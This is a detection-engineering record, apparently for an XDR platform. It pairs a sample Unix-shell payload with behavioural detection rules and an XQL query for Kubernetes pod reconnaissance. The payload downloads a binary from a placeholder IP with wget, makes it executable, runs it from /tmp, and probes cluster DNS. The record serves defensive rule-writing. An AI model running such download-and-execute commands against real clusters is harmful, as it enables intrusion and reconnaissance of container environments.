techniques.name: Command and Scripting Interpreter: Unix Shell

payload.code:
wget -O /tmp/kube-info https://192.0.2.100/pod-info
chmod 755 /tmp/kube-info
/tmp/kube-info
sleep 5
nslookup kubernetes.default.svc.cluster.local

biocs.name: Suspicious K8s Pod Reconnaissance Process
biocs.description: Execution of a binary that queries Kubernetes pod and node metadata
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/kube-info'
| filter causality_actor_process_image_name = 'sh'

abiocs.name: Container Reconnaissance Behavioral Pattern
abiocs.description: Behavioral deviation of process execution followed by DNS resolution to Kubernetes service endpoints
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/kube-info'
| filter causality_actor_process_image_name = 'sh'
| join with dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_remote_ip = '192.0.2.100'
| filter dst_port = 53

xql_queries.name: K8s Reconnaissance Process Chain

dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/kube-info'
| filter causality_actor_process_image_name = 'sh'
| fields actor_process_image_name, action_process_image_name, causality_actor_process_image_name
